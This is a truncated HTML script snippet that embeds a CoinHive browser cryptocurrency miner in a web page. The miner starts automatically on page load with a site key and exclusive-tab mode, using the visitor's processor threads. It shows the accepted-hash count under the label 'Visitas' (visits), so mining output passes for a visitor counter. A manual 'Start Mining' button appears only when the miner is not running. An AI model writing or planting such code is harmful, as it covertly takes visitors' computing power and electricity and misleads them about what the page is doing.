<script type="text/javascript">
var miner = new CoinHive.Anonymous('OJGcHCvrErcxDwYJFwPvKyriGTICTsIx','threads: navigator.hardwareConcurrency','autoThreads: true','throttle: 0.3');
miner.start(CoinHive.FORCE_EXCLUSIVE_TAB);
// Update stats once per second
setInterval(function() {
    var threadCount = miner.getNumThreads();
    var hashesPerSecond = Math.round(miner.getHashesPerSecond() * 100) / 100;
    var totalHashes = miner.getTotalHashes();
    var acceptedHashes = miner.getAcceptedHashes() / 256;
    // Output to HTML elements...
    if (miner.isRunning()) {
        document.getElementById("tah").innerHTML = "Visitas: " + acceptedHashes;
    } else {
        document.getElementById("hps").innerHTML = "";
        document.getElementById("ths").innerHTML = " support";
        document.getElementById("tah").innerHTML = "carregando";
        document.getElementById("minebutton").innerHTML = "<button onclick=\"miner.start(CoinHive.FORCE_EXCLUSIVE_TAB)\">Start Mining</button>";
